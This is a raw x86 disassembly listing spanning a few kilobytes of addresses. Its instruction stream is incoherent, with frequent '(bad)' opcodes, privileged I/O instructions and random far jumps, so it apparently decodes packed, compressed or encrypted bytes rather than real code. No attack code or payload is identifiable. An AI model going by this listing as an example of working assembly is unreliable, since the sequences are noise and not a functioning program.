  4256d0:	cmp    cl,BYTE PTR [ebx+0x1f90ddc2]
  4256d6:	mov    WORD PTR [edi+0x3bcdb44d],?
  4256dc:	inc    esi
  4256dd:	lea    ebx,[edx]
  4256df:	retf   
  4256e0:	jecxz  0x425702
  4256e2:	leave  
  4256e3:	add    BYTE PTR [edx],ch
  4256e5:	popa   
  4256e6:	xchg   ecx,eax
  4256e7:	bound  esi,QWORD PTR [edx]
  4256e9:	pop    ds
  4256ea:	lods   al,BYTE PTR ds:[esi]
  4256eb:	stc    
  4256ec:	cmp    BYTE PTR [eax],al
  4256ee:	pop    edx
  4256ef:	call   0x163fff75
  4256f4:	mov    dh,0x16
  4256f6:	push   ecx
  4256f7:	inc    ebp
  4256f8:	std    
  4256f9:	xchg   DWORD PTR [eax+0x66e7279f],ebp
  4256ff:	cmp    BYTE PTR [ebx-0x1def827d],dl
  425705:	jnp    0x425732
  425707:	loop   0x425694
  425709:	jecxz  0x425733
  42570b:	(bad)  
  42570c:	dec    ecx
  42570d:	mov    al,ds:0xf8f7de1c
  425712:	push   0xffffffce
  425714:	(bad)  
  425715:	pop    edx
  425716:	inc    esi
  425717:	jne    0x425773
  425719:	dec    eax
  42571a:	xchg   esp,eax
  42571b:	hlt    
  42571c:	pop    ebx
  42571d:	iret   
  42571e:	loope  0x42576b
  425720:	xor    esp,ecx
  425722:	push   esi
  425723:	push   esp
  425724:	int3   
  425725:	or     al,0xb
  425727:	ja     0x425788
  425729:	and    eax,0x773e4ee7
  42572e:	pop    esp
  42572f:	fadd   QWORD PTR [ebx-0x52423f04]
  425735:	aaa    
  425736:	cmp    eax,0x105ed37d
  42573b:	fs imul ecx,ecx,0x3d
  42573f:	jne    0x425735
  425741:	inc    ebx
  425742:	pop    ds
  425743:	jno    0x4257b1
  425745:	out    0xc4,al
  425747:	fsubr  QWORD PTR [ebp+0x68b29b4f]
  42574d:	push   0xffffffec
  42574f:	cdq    
  425750:	scas   al,BYTE PTR es:[di]
  425752:	les    esi,FWORD PTR [ebx-0xf]
  425755:	adc    DWORD PTR [ebx-0x2f],esp
  425758:	add    eax,0x19767a8e
  42575d:	imul   ebp,edx,0xfffffffc
  425760:	sbb    DWORD PTR [edx+0x53],ebx
  425763:	jnp    0x4257d3
  425765:	or     eax,0x18c6f036
  42576a:	dec    ebx
  42576b:	jl     0x425760
  42576d:	mov    dh,0x3a
  42576f:	inc    esi
  425770:	and    eax,0x70b226f0
  425775:	mov    cl,0x93
  425777:	sbb    edi,DWORD PTR [esi*1+0x68644396]
  42577e:	(bad)  [ebp+0x4f5a6a2c]
  425784:	jno    0x4257d1
  425786:	xchg   edi,eax
  425787:	or     al,0xfb
  425789:	int3   
  42578a:	mov    dl,0x57
  42578c:	fdivr  QWORD PTR [edx-0x63f216cf]
  425792:	or     al,0x1e
  425794:	ss sub al,0xa2
  425797:	jp     0x4257ec
  425799:	test   bl,ah
  42579b:	(bad)
  42579e:	xor    al,0xc0
  4257a0:	in     al,0x5e
  4257a2:	hlt    
  4257a3:	loop   0x425745
  4257a5:	cmc    
  4257a6:	sti    
  4257a7:	fucomip st,st(2)
  4257a9:	sbb    ebx,DWORD PTR [ecx-0x1fa9077f]
  4257af:	adc    ebp,ecx
  4257b1:	test   BYTE PTR [ecx],dh
  4257b3:	push   ebp
  4257b4:	in     eax,0xd
  4257b6:	into   
  4257b7:	add    edx,DWORD PTR [edi+ecx*8]
  4257ba:	iret   
  4257bb:	(bad)
  4257bf:	fwait
  4257c0:	neg    DWORD PTR [esi-0x80]
  4257c3:	out    dx,eax
  4257c4:	inc    edx
  4257c5:	pusha  
  4257c6:	inc    esi
  4257c7:	dec    ebx
  4257c8:	inc    esp
  4257c9:	stos   BYTE PTR es:[edi],al
  4257ca:	fwait
  4257cb:	xchg   ebx,eax
  4257cc:	das    
  4257cd:	adc    dh,BYTE PTR [edi-0x77]
  4257d0:	sub    al,ah
  4257d2:	(bad)  
  4257d3:	pop    edi
  4257d4:	in     al,dx
  4257d5:	xlat   BYTE PTR ds:[ebx]
  4257d6:	push   0xa26871f6
  4257db:	push   ss
  4257dc:	push   eax
  4257dd:	std    
  4257de:	dec    edx
  4257df:	inc    ebp
  4257e0:	or     DWORD PTR [ebx],edx
  4257e2:	stos   BYTE PTR es:[di],al
  4257e4:	sbb    ebx,ecx
  4257e6:	bound  edx,QWORD PTR [esi+0x6df88b8e]
  4257ec:	or     BYTE PTR [ebx],bl
  4257ee:	jmp    0x7324:0xceb216d2
  4257f5:	repz in al,0x9
  4257f8:	xchg   edx,eax
  4257f9:	and    ch,0xd1
  4257fc:	sbb    al,0xe1
  4257fe:	cmovno edx,eax
  425801:	cmp    DWORD PTR [edx+0x50d1b00a],ecx
  425807:	xchg   edx,eax
  425808:	mov    dl,0xa5
  42580a:	xchg   esp,eax
  42580b:	int    0x1
  42580d:	xchg   ebp,eax
  42580e:	dec    edi
  42580f:	icebp  
  425810:	add    al,BYTE PTR [esi-0x32f26837]
  425816:	(bad)  
  425818:	loopne 0x425845
  42581a:	lahf   
  42581b:	stos   DWORD PTR es:[edi],eax
  42581c:	sub    al,0x74
  42581e:	pop    ebx
  42581f:	repnz inc eax
  425821:	jp     0x42583b
  425823:	pop    DWORD PTR [edx-0xb6ab8b9]
  425829:	test   BYTE PTR [esp+esi*4+0x15d00a00],0x71
  425831:	push   cs
  425832:	cli    
  425833:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425834:	cs loop 0x4257f7
  425837:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425838:	mov    BYTE PTR [ebx-0x32e204ff],0xcb
  42583f:	add    al,0x4b
  425841:	xor    al,0x2
  425843:	push   0x613a027f
  425848:	std    
  425849:	das    
  42584a:	daa    
  42584b:	int3   
  42584c:	sbb    edi,ecx
  42584e:	xor    eax,0x54020c2c
  425853:	xchg   DWORD PTR [edi-0x6c4cd983],ebx
  425859:	retf   
  42585a:	sbb    bh,cl
  42585c:	add    dh,BYTE PTR [esi+0x7ea0a9f6]
  425862:	jmp    0xf28be131
  425867:	bound  esi,QWORD PTR [ebx*8+0x1748e301]
  42586e:	enter  0xbaff,0x2b
  425872:	ror    DWORD PTR [esp+eax*1+0x56],0x50
  425877:	jmp    0x42584a
  425879:	adc    DWORD PTR [esi+0x7d],esi
  42587c:	jl     0x425864
  42587e:	xchg   edx,eax
  42587f:	lahf   
  425880:	ret    
  425881:	pop    eax
  425882:	(bad)  
  425883:	cli    
  425884:	icebp  
  425885:	cmp    al,0x5d
  425887:	pop    ss
  425888:	push   ebp
  425889:	pop    esi
  42588a:	int3   
  42588b:	inc    edx
  42588c:	ror    BYTE PTR [edi-0x157478d4],1
  425892:	ins    BYTE PTR es:[edi],dx
  425893:	add    DWORD PTR [eax],ecx
  425895:	jge    0x4258e4
  425897:	dec    esi
  425898:	nop
  425899:	cld    
  42589a:	(bad)  
  42589b:	mov    ebx,0x5658b1ef
  4258a0:	sub    al,0xe3
  4258a2:	loop   0x4258ad
  4258a4:	sub    al,0x7e
  4258a6:	inc    eax
  4258a7:	nop
  4258a8:	push   edi
  4258a9:	int    0x6c
  4258ab:	rol    DWORD PTR [eax-0x16],cl
  4258ae:	pop    ecx
  4258af:	add    bh,BYTE PTR [edx]
  4258b1:	aam    0x95
  4258b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4258b4:	(bad)  
  4258b5:	enter  0xa931,0x30
  4258b9:	push   ss
  4258ba:	leave  
  4258bb:	in     eax,0xbd
  4258bd:	test   al,0x32
  4258bf:	inc    esp
  4258c0:	adc    eax,0xc8405e0d
  4258c5:	add    eax,0xdbdaf8ab
  4258ca:	fistp  WORD PTR [edx+esi*2]
  4258cd:	pop    edi
  4258ce:	pop    esp
  4258cf:	test   DWORD PTR [ebx+0x209891ad],0xecb80da5
  4258d9:	mov    ch,0x64
  4258db:	sbb    DWORD PTR [edi],0xffffffbb
  4258de:	les    esi,FWORD PTR [eax-0x22]
  4258e1:	jmp    0x4258ad
  4258e3:	mov    esp,0x557483c2
  4258e8:	mov    ss,esi
  4258ea:	popa   
  4258eb:	popa   
  4258ec:	jnp    0x425954
  4258ee:	mov    ds:0x758904a6,al
  4258f3:	pop    ebp
  4258f4:	rcr    cl,1
  4258f6:	sti    
  4258f7:	pop    esp
  4258f8:	push   ecx
  4258f9:	jp     0x425960
  4258fb:	rcr    esi,1
  4258fd:	arpl   WORD PTR [edx+0x5230e22a],sp
  425903:	mov    esi,0xbeb191f8
  425908:	add    eax,0xdcf81afb
  42590d:	jl     0x425898
  42590f:	mov    esp,0xe821b44d
  425914:	fucomip st,st(5)
  425916:	jno    0x42596f
  425918:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425919:	xchg   ecx,eax
  42591a:	out    0x4b,al
  42591c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42591d:	sbb    dl,BYTE PTR [edi]
  42591f:	loop   0x4258dc
  425921:	data16 aam 0x73
  425924:	stos   BYTE PTR es:[edi],al
  425925:	mov    ecx,0x3a0c929a
  42592a:	or     eax,0x9b6d88a3
  42592f:	xchg   ebx,eax
  425930:	ins    DWORD PTR es:[edi],dx
  425931:	shl    esi,0xff
  425934:	add    BYTE PTR [eax],ah
  425936:	mov    dl,BYTE PTR [ecx]
  425938:	pop    ecx
  425939:	or     al,0xc7
  42593b:	inc    ebp
  42593c:	add    al,0xfe
  42593e:	sub    esp,esi
  425940:	add    ebx,DWORD PTR [esi+0x5a]
  425943:	add    al,0x32
  425945:	xor    eax,0x7c903dba
  42594a:	xchg   esp,eax
  42594b:	shr    BYTE PTR [edi-0x4d9ea19],1
  425951:	mov    al,0xb9
  425953:	xchg   edx,eax
  425954:	mov    ds:0x7a5ab48c,al
  425959:	cmp    esp,ecx
  42595b:	ficom  DWORD PTR [ebx-0x4d]
  42595e:	sub    al,ah
  425960:	and    eax,0xd72f8acc
  425965:	add    eax,0xb5103c52
  42596a:	inc    eax
  42596b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42596c:	adc    edx,DWORD PTR [edx]
  42596e:	in     al,dx
  42596f:	push   esp
  425970:	fisub  DWORD PTR [edx+edi*2+0x6e7b9a5a]
  425977:	push   cs
  425978:	mov    ecx,ebp
  42597a:	pop    edx
  42597b:	out    dx,al
  42597c:	push   ds
  42597d:	pop    esi
  42597e:	or     eax,0x8445b556
  425983:	jo     0x425947
  425985:	out    0xf8,al
  425987:	sbb    bl,0x64
  42598a:	xor    cl,cl
  42598c:	fnsave [ebx]
  42598e:	mov    esi,DWORD PTR [edi-0x3f964814]
  425994:	or     DWORD PTR [eax-0x55],edi
  425997:	sbb    al,0x5f
  425999:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42599a:	mov    edi,0x83258ce
  42599f:	mov    al,0x85
  4259a1:	sub    dh,BYTE PTR [eax-0x24]
  4259a4:	cli    
  4259a5:	fsubrp st(7),st
  4259a7:	lods   eax,DWORD PTR ds:[esi]
  4259a8:	sub    esi,edi
  4259aa:	in     eax,0x66
  4259ac:	or     ch,dl
  4259ae:	fdiv   QWORD PTR ds:[eax-0x616d2a72]
  4259b5:	cmc    
  4259b6:	or     DWORD PTR [edx+0x80a25f6],esi
  4259bc:	(bad)  
  4259be:	adc    eax,0xc3e8d29a
  4259c3:	aas    
  4259c4:	stc    
  4259c5:	lahf   
  4259c6:	jl     0x4259d8
  4259c8:	mov    ebp,0x7262e316
  4259cd:	add    eax,0x9584296
  4259d2:	xchg   edi,eax
  4259d3:	mov    dh,0xb4
  4259d5:	out    0xa7,al
  4259d7:	addr16 imul esp,edx,0x6384ba9a
  4259de:	fnstcw WORD PTR [esi-0x3531d7a7]
  4259e4:	fdivr  DWORD PTR [eax]
  4259e6:	add    esi,DWORD PTR [ebx+0x6e]
  4259e9:	mov    WORD PTR [edx+0x2838d213],es
  4259ef:	mov    dl,0xe5
  4259f1:	cs mov esp,cs
  4259f4:	push   DWORD PTR [esp+ebp*2-0x45]
  4259f8:	inc    esp
  4259f9:	clc    
  4259fa:	test   eax,0xfc8ca0f8
  4259ff:	or     al,0x5a
  425a01:	xor    DWORD PTR [ecx+0x574a1b89],0xa0aed762
  425a0b:	inc    ebp
  425a0c:	stc    
  425a0d:	lock sub eax,DWORD PTR [eax+edx*1+0x2049409b]
  425a15:	in     eax,dx
  425a16:	ror    BYTE PTR [esi],1
  425a18:	sub    esi,DWORD PTR [edx+ebx*4]
  425a1b:	inc    ecx
  425a1c:	cdq    
  425a1d:	mov    ebx,edi
  425a1f:	jb     0x4259e9
  425a21:	mov    edi,0x8fb505cb
  425a26:	jns    0x425a1a
  425a28:	(bad)  
  425a29:	jp     0x4259f5
  425a2b:	xor    BYTE PTR [edx+0x1d],ch
  425a2e:	mov    ecx,DWORD PTR [ebp+0x6d]
  425a31:	shl    bh,0x95
  425a34:	adc    eax,0x8dd709f8
  425a39:	test   DWORD PTR [ecx],esi
  425a3b:	mov    al,ds:0xf39a5c9e
  425a40:	iret   
  425a41:	out    dx,al
  425a42:	and    BYTE PTR [ebp-0x7d],dh
  425a45:	js     0x4259e7
  425a47:	push   es
  425a48:	ins    BYTE PTR es:[edi],dx
  425a49:	jmp    0x2c94:0xe34bcd8b
  425a50:	aad    0x4d
  425a52:	mov    edi,0xf71beabe
  425a57:	sub    eax,0x15b17576
  425a5c:	icebp  
  425a5d:	push   eax
  425a5e:	(bad)
  425a62:	enter  0x43f0,0xbf
  425a66:	inc    eax
  425a67:	sar    BYTE PTR [esi+0x1a],cl
  425a6a:	fdiv   QWORD PTR ds:0xdbefde00
  425a70:	add    eax,0x9f04db1d
  425a75:	mov    ah,0x78
  425a77:	and    bl,BYTE PTR cs:[eax+0x35a88ff8]
  425a7e:	and    eax,0xb9046cfd
  425a83:	jbe    0x425a7b
  425a85:	lods   eax,DWORD PTR ds:[esi]
  425a86:	sub    bh,cl
  425a88:	pop    ds
  425a89:	mov    cl,0x2f
  425a8b:	add    ah,BYTE PTR [esi-0xc]
  425a8e:	cs push ds
  425a90:	ror    DWORD PTR [eax-0x391ee0f9],cl
  425a96:	je     0x425a48
  425a98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425a99:	xor    BYTE PTR [edx-0x113f729b],al
  425a9f:	dec    edx
  425aa0:	ret    0x74a1
  425aa3:	dec    eax
  425aa4:	in     eax,0x76
  425aa6:	mov    cl,0xd0
  425aa8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425aa9:	mov    dh,0xb4
  425aab:	adc    ecx,0xba28de2a
  425ab1:	cmp    bh,BYTE PTR [eax+0x11a9859a]
  425ab7:	nop    DWORD PTR [ecx-0x55]
  425abb:	mov    edx,0x2a9cf853
  425ac0:	repz pop edx
  425ac2:	ret    
  425ac3:	lods   eax,DWORD PTR ds:[esi]
  425ac4:	xchg   ebp,eax
  425ac5:	inc    edi
  425ac6:	pop    ss
  425ac7:	add    eax,DWORD PTR [ebx*1-0x5b5f86d5]
  425ace:	addr16 xchg edx,eax
  425ad0:	hlt    
  425ad1:	in     al,0xf5
  425ad3:	aad    0x2
  425ad5:	ja     0x425a9a
  425ad7:	push   cs
  425ad8:	push   esi
  425ad9:	popf   
  425ada:	aaa    
  425adb:	jl     0x425ae1
  425add:	sub    esp,ecx
  425adf:	and    DWORD PTR [ebp-0x6d],0xa075b32b
  425ae6:	ins    BYTE PTR es:[edi],dx
  425ae7:	inc    ebx
  425ae8:	pop    eax
  425ae9:	xor    al,0xba
  425aeb:	out    dx,al
  425aec:	sahf   
  425aed:	xchg   ecx,eax
  425aee:	or     DWORD PTR [ebx-0xa],ebp
  425af1:	or     al,0x2b
  425af3:	mov    BYTE PTR [edi+0xcc0e5f1],ah
  425af9:	aam    0x76
  425afb:	or     eax,0x9c79e2c1
  425b00:	(bad)  
  425b01:	rcr    eax,1
  425b03:	or     al,BYTE PTR [ecx-0x68]
  425b06:	jl     0x425ad2
  425b08:	adc    ch,BYTE PTR [esi]
  425b0a:	addr16 shl edx,cl
  425b0d:	mov    ebp,0x6e7a08bc
  425b12:	xchg   edi,eax
  425b13:	jmp    0x3091:0xe487f15
  425b1a:	int3   
  425b1b:	mov    ecx,ebp
  425b1d:	dec    edx
  425b1e:	jmp    0xe4ce5c35
  425b23:	mov    ecx,0x4c4c0769
  425b28:	(bad)  
  425b29:	push   esi
  425b2a:	je     0x425b61
  425b2c:	(bad)  
  425b2d:	mov    edi,0xf41b1732
  425b32:	jecxz  0x425ba1
  425b34:	mov    ds:0xf806d2b4,al
  425b39:	shr    BYTE PTR [edx+0x42],1
  425b3c:	jns    0x425b9b
  425b3e:	call   DWORD PTR [edx+0x7a0f8918]
  425b44:	enter  0xd64a,0x7e
  425b48:	jae    0x425aef
  425b4a:	sahf   
  425b4b:	sbb    bl,ah
  425b4d:	xlat   BYTE PTR ds:[ebx]
  425b4e:	adc    al,0x6b
  425b50:	sub    al,0xb5
  425b52:	mov    ecx,0x8c960652
  425b57:	out    0x5b,eax
  425b59:	in     eax,0x65
  425b5b:	add    DWORD PTR [ebp-0x5a],ebx
  425b5e:	and    eax,0xf3f3816d
  425b63:	mov    ch,0x39
  425b65:	inc    esp
  425b66:	jb     0x425be1
  425b68:	ret    
  425b69:	jo     0x425ba6
  425b6b:	stos   DWORD PTR es:[edi],eax
  425b6c:	or     eax,0x4b5d7d4c
  425b71:	and    esi,esi
  425b73:	pop    ebp
  425b74:	dec    edi
  425b75:	xchg   WORD PTR [esi-0x78],cx
  425b79:	inc    edi
  425b7a:	ds idiv ebp
  425b7d:	xchg   esp,eax
  425b7e:	dec    edi
  425b7f:	loop   0x425bbd
  425b81:	leave  
  425b82:	lea    ebp,ds:0xca7cf917
  425b88:	enter  0x5970,0xea
  425b8c:	test   ebp,0x59a5174c
  425b92:	out    0x1f,eax
  425b94:	mov    gs,WORD PTR [esi+ebp*1-0x21828c2d]
  425b9b:	loope  0x425bb8
  425b9d:	fsubp  st(7),st
  425b9f:	cmp    ah,BYTE PTR [edi+0x1537cb8b]
  425ba5:	aas    
  425ba6:	mov    dh,0xa
  425ba8:	leave  
  425ba9:	pusha  
  425baa:	jns    0x425b3c
  425bac:	retf   
  425bad:	out    0x43,eax
  425baf:	fdivr  st(0),st
  425bb1:	ret    0xdbbb
  425bb4:	jne    0x425b5e
  425bb6:	lods   al,BYTE PTR ds:[esi]
  425bb7:	dec    ebp
  425bb8:	or     BYTE PTR [edi],0x18
  425bbb:	stos   BYTE PTR es:[edi],al
  425bbc:	call   0xaba5:0xb625f017
  425bc3:	or     BYTE PTR [eax+0x5c],ch
  425bc6:	xchg   esi,eax
  425bc7:	ds ja  0x425bc8
  425bca:	cdq    
  425bcb:	or     eax,0x6db0ab16
  425bd0:	test   DWORD PTR [edi],0xc5682b19
  425bd6:	or     al,0x2c
  425bd8:	(bad)  
  425bd9:	sar    DWORD PTR [ecx],1
  425bdb:	inc    eax
  425bdc:	adc    eax,0x822186c6
  425be1:	es lock (bad) 
  425be4:	fcmovnu st,st(6)
  425be6:	dec    edi
  425be7:	push   0x66
  425be9:	cmc    
  425bea:	repz sbb edi,ebp
  425bed:	mov    ebp,esi
  425bef:	in     eax,0x7
  425bf1:	jno    0x425bbc
  425bf3:	inc    DWORD PTR [ebp+0x632a8ad2]
  425bf9:	xchg   ebx,eax
  425bfa:	mov    ds:0x53ec1eff,al
  425bff:	add    eax,0x22a30162
  425c04:	cwde   
  425c05:	imul   ebp,DWORD PTR [ecx+0x6e69cc31],0xea3701dc
  425c0f:	adc    eax,0xf2ada0b8
  425c14:	fwait
  425c15:	mov    ds:0x245aaa6e,al
  425c1a:	in     al,0x35
  425c1c:	xchg   edi,eax
  425c1d:	xor    eax,0xaaa8c8db
  425c22:	adc    BYTE PTR [edi-0x71ae9165],0x2e
  425c29:	cmc    
  425c2a:	adc    bl,cl
  425c2c:	mov    eax,0xb2fa17a1
  425c31:	cwde   
  425c32:	and    al,0xa9
  425c34:	inc    edx
  425c35:	sbb    eax,0x90898639
  425c3a:	add    DWORD PTR [esi],ebp
  425c3c:	pop    edx
  425c3d:	jmp    0x494e:0xd952f7ee
  425c44:	xchg   ecx,eax
  425c45:	mov    WORD PTR [edi+ebx*4+0x6a],es
  425c49:	(bad)  
  425c4b:	test   DWORD PTR es:[esi+0x158af52e],edx
  425c52:	mov    bh,0xf
  425c54:	in     al,0x33
  425c56:	sbb    BYTE PTR [eax-0x54],0x97
  425c5a:	push   edx
  425c5b:	add    BYTE PTR [ebp-0x27],ch
  425c5e:	icebp  
  425c5f:	fnstenv [ebp+0x6d214faf]
  425c65:	frstor [eax+0x6e]
  425c68:	data16 cmp al,0xaf
  425c6b:	(bad)
  425c6e:	lea    ecx,[eax-0x5551aea3]
  425c74:	xchg   edi,eax
  425c75:	add    al,0x1d
  425c77:	jne    0x425cb4
  425c79:	fxch   st(6)
  425c7b:	sahf   
  425c7c:	shl    BYTE PTR [ebp-0x76],cl
  425c7f:	jo     0x425ce4
  425c81:	mov    ebp,DWORD PTR [eax]
  425c83:	push   es
  425c84:	popa   
  425c85:	arpl   bx,sp
  425c87:	hlt    
  425c88:	mov    ds:0xe483ed12,al
  425c8d:	mov    bl,0x18
  425c8f:	push   ds
  425c90:	mov    dl,0xad
  425c92:	(bad)  
  425c93:	dec    eax
  425c94:	ins    DWORD PTR es:[edi],dx
  425c95:	add    ebx,DWORD PTR [ebx+0x78]
	...
  425d14:	out    0xd2,al
  425d16:	xchg   esp,eax
  425d17:	icebp  
  425d18:	mov    ah,0xf7
  425d1a:	out    0xd7,eax
  425d1c:	aad    0x75
  425d1e:	(bad)  
  425d1f:	adc    DWORD PTR [esi],edi
  425d21:	int3   
  425d22:	sahf   
  425d23:	aam    0x89
  425d25:	out    dx,eax
  425d26:	add    DWORD PTR [eax],eax
  425d28:	ins    BYTE PTR es:[edi],dx
  425d29:	pop    es
  425d2a:	add    BYTE PTR [eax],al
  425d2c:	inc    edx
  425d2d:	jmp    0x3e894cab
  425d32:	dec    ecx
  425d33:	je     0x425d41
  425d35:	add    edi,DWORD PTR [edi-0x5b]
  425d38:	pop    ebp
  425d39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d3a:	fwait
  425d3b:	dec    edx
  425d3c:	hlt    
  425d3d:	mov    esi,0x816c6256
  425d42:	push   es
  425d43:	mov    dl,0xa2
  425d45:	fisttp DWORD PTR [esi]
  425d47:	mov    ds:0x8d0fdf74,eax
  425d4c:	jmp    0x425d36
  425d4e:	lods   eax,DWORD PTR ds:[esi]
  425d4f:	and    al,0xb7
  425d51:	dec    edx
  425d52:	and    BYTE PTR [esi+0x28],bh
  425d55:	pop    edi
  425d56:	bound  esi,QWORD PTR [ecx-0x28]
  425d59:	int3   
  425d5a:	add    eax,0x2a3d91ca
  425d5f:	ds das 
  425d61:	mov    edi,0xb98d008c
  425d66:	mov    eax,0x517d752e
  425d6b:	inc    edi
  425d6c:	adc    eax,0x9c75f58c
  425d71:	fdiv   DWORD PTR [eax]
  425d73:	arpl   WORD PTR [edx-0x704e31cf],bx
  425d79:	dec    edi
  425d7a:	gs push ds
  425d7c:	jbe    0x425dee
  425d7e:	pop    edx
  425d7f:	push   ebp
  425d80:	jo     0x425dda
  425d82:	data16 mov dh,0x3f
  425d85:	xor    BYTE PTR [ecx+0x69],dh
  425d88:	xor    DWORD PTR [ecx+0x60],ebx
  425d8b:	sub    eax,DWORD PTR [edi]
  425d8d:	inc    esp
  425d8e:	push   esi
  425d8f:	ret    
  425d90:	fidivr DWORD PTR [edi]
  425d92:	retf   
  425d93:	dec    edx
  425d94:	jecxz  0x425d60
  425d96:	sub    DWORD PTR [edi-0x23e0ca0f],ebp
  425d9c:	std    
  425d9d:	cld    
  425d9e:	cmp    cl,BYTE PTR [edi-0x2bb9f061]
  425da4:	retf   0xe431
  425da7:	popf   
  425da8:	dec    edi
  425da9:	push   esi
  425daa:	enter  0x92e9,0x77
  425dae:	mov    ebx,0x2af10401
  425db3:	adc    dh,BYTE PTR [eax-0xd71ac8c]
  425db9:	(bad)  
  425dba:	icebp  
  425dbb:	stos   BYTE PTR es:[edi],al
  425dbc:	adc    cl,BYTE PTR cs:[edx-0x16]
  425dc0:	inc    esp
  425dc1:	or     dh,BYTE PTR [eax-0x14]
  425dc4:	add    DWORD PTR [eax-0x4c],eax
  425dc7:	out    0xb,al
  425dc9:	or     eax,0x609ea0d9
  425dce:	mov    esp,0xf00fff68
  425dd3:	pop    ebp
  425dd4:	gs jg  0x425db5
  425dd7:	push   ss
  425dd8:	xor    al,0x27
  425dda:	cmp    eax,edx
  425ddc:	mov    cl,0x59
  425dde:	xchg   edi,eax
  425ddf:	(bad)  
  425de0:	mov    dh,0xe7
  425de2:	pusha  
  425de3:	or     eax,0x14e1320e
  425de8:	add    eax,0xf3a6d4be
  425ded:	mov    eax,ds:0xe8ab1391
  425df2:	je     0x425e58
  425df4:	cld    
  425df5:	dec    ebx
  425df6:	or     DWORD PTR [ebp+0x40a925d1],0xffffff9d
  425dfd:	sbb    al,0x33
  425dff:	rcl    BYTE PTR [ebp+0x1a],1
  425e02:	gs jb  0x425d99
  425e05:	not    DWORD PTR [ebx-0x1da87169]
  425e0b:	push   eax
  425e0c:	ins    BYTE PTR es:[edi],dx
  425e0d:	stos   DWORD PTR es:[edi],eax
  425e0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425e0f:	fs std 
  425e11:	inc    ebx
  425e12:	ja     0x425e06
  425e14:	cwde   
  425e15:	out    dx,al
  425e16:	push   ds
  425e17:	fs cld 
  425e19:	push   edi
  425e1a:	xchg   ebx,eax
  425e1b:	cmp    bl,bh
  425e1d:	shl    DWORD PTR [ecx+ebx*8],1
  425e20:	test   eax,0xb7bca244
  425e25:	and    al,0x4e
  425e27:	mov    edi,DWORD PTR [ebx+0x3b261bab]
  425e2d:	sbb    DWORD PTR [esi-0x77],ecx
  425e30:	ds xchg esp,eax
  425e32:	xchg   al,dl
  425e34:	sub    ah,ah
  425e36:	test   BYTE PTR [eax+0x3f],ch
  425e39:	fistp  DWORD PTR ds:0x1d3f08ca
  425e3f:	adc    al,0xde
  425e41:	retf   0x9686
  425e44:	out    dx,al
  425e45:	icebp  
  425e46:	aas    
  425e47:	fwait
  425e48:	out    dx,al
  425e49:	jno    0x425dde
  425e4b:	jbe    0x425ea0
  425e4d:	daa    
  425e4e:	lods   eax,DWORD PTR ds:[esi]
  425e4f:	xor    al,0xc3
  425e52:	fdiv   DWORD PTR [ecx]
  425e54:	jnp    0x425ecc
  425e56:	mov    WORD PTR [edx+0x1e],fs
  425e59:	add    dl,0x97
  425e5c:	mov    ss,WORD PTR [esi+0x79c40a3b]
  425e62:	xor    DWORD PTR [ecx-0x609c4372],ebp
  425e68:	xor    DWORD PTR [eax],ebx
  425e6a:	inc    ebp
  425e6b:	jmp    0x425df2
  425e6d:	sub    DWORD PTR [edi+eax*4-0x31fdeb40],esp
  425e74:	adc    eax,0xd328ec1
  425e79:	out    0x9a,al
  425e7b:	adc    al,0xad
  425e7d:	cmp    bh,al
  425e7f:	test   BYTE PTR [ecx],cl
  425e81:	cli    
  425e82:	test   DWORD PTR [ecx],edi
  425e84:	jp     0x425e0d
  425e86:	xchg   esi,eax
  425e87:	test   BYTE PTR ds:0x9262f799,cl
  425e8d:	or     esp,DWORD PTR [edx]
  425e8f:	sbb    esi,esp
  425e91:	or     DWORD PTR [edi-0x44],esp
  425e94:	repnz mov al,0x17
  425e97:	jmp    0x425e5c
  425e99:	sub    cl,BYTE PTR [ebx+0x549db9c5]
  425e9f:	ror    ah,cl
  425ea1:	in     al,dx
  425ea2:	daa    
  425ea3:	jne    0x425e8d
  425ea5:	jecxz  0x425f05
  425ea7:	call   0x49c63d98
  425eac:	jle    0x425e78
  425eae:	inc    edx
  425eaf:	dec    esp
  425eb0:	shl    cl,1
  425eb2:	xchg   BYTE PTR [ebx-0x2cc09701],dh
  425eb8:	pop    ds
  425eb9:	sub    al,0x5d
  425ebb:	cmp    ebx,0xae7fe0da
  425ec1:	adc    bh,BYTE PTR [edx]
  425ec3:	(bad)  
  425ec5:	fmul   QWORD PTR [esi+0x21d286e2]
  425ecb:	jno    0x425e91
  425ecd:	adc    eax,0x37bd7c97
  425ed2:	fwait
  425ed3:	xchg   esp,eax
  425ed4:	sub    eax,0xfc78ed14
  425ed9:	mov    bh,0x7d
  425edb:	push   ebx
  425edc:	jmp    FWORD PTR ds:0xba08804d
  425ee2:	pop    eax
  425ee3:	enter  0x29a5,0xd2
  425ee7:	rol    edi,0xfc
  425eea:	lods   al,BYTE PTR ds:[esi]
  425eeb:	or     ah,BYTE PTR [esi+0x26]
  425eee:	pop    esp
  425eef:	mov    DWORD PTR ds:0xa72fd06e,esp
  425ef5:	ins    DWORD PTR es:[edi],dx
  425ef6:	repz aaa 
  425ef8:	ffreep st(4)
  425efa:	add    dl,dh
  425efc:	inc    esi
  425efd:	add    DWORD PTR [edx-0x5cd97f85],eax
  425f03:	aam    0xbe
  425f05:	clc    
  425f06:	pop    edi
  425f07:	(bad)  
  425f08:	adc    BYTE PTR [ecx+0x7e383c9],bh
  425f0e:	add    DWORD PTR [eax-0x773f7f61],0xdd423e81
  425f18:	adc    DWORD PTR [si],esp
  425f1b:	pop    edi
  425f1c:	pop    edi
  425f1d:	inc    ebp
  425f1e:	mov    ecx,0x36666784
  425f23:	add    dl,BYTE PTR [ebx+0x5a0c0d65]
  425f29:	cmp    ebx,DWORD PTR [eax+0xc21cd4]
  425f2f:	add    BYTE PTR [eax+0x1b],bl
  425f32:	mov    ds:0xf43a7e3b,al
  425f37:	push   ebp
  425f38:	dec    eax
